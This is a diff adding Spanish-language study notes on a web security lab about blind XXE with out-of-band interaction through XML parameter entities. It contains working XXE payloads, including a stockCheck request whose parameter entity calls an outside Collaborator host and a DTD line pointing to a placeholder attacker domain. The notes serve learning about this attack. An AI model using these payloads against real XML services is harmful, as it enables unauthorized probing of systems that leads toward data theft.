@@ -148,6 +148,37 @@ exfiliar informacion.
   
  EL burp colaborator permite ver los logs tanto del http como de DNS "Debería ver algunas interacciones DNS y HTTP iniciadas por la aplicación como resultado de su carga útil."
   
+# Blind XXE with out-of-band interaction via XML parameter entities
+  
+  Para este laboratorio el XML no regresa ninguna respuesta es por eso que se intenta monitorear las peticiones dns y http con el burp colaborator tambien 
+  introduce un nuevo concepto
+  
+  ##  XML parameter entities
+  
+  Es otra forma de declarar entidades dentro de un DTD de la siguiente manera:
+  
+  ```
+ <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]> 
+
+  ```
+  Y cuando se quiere hacer referencia a esta en ves de usar el & usas el % por ejemplo
+  
+  ```
+  %myparameterentity;
+  
+  ```
+  Y para resolverlo hacemos uso de todo
+  
+  
+  ``` 
+  
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://2ehm31goawicaax221p33qigl7rxfm.oastify.com"> %xxe; ]>
+<stockCheck><productId>
+%xxe;
+</productId><storeId>1</storeId></stockCheck>
+  
+  ```
   
 Referencias
 
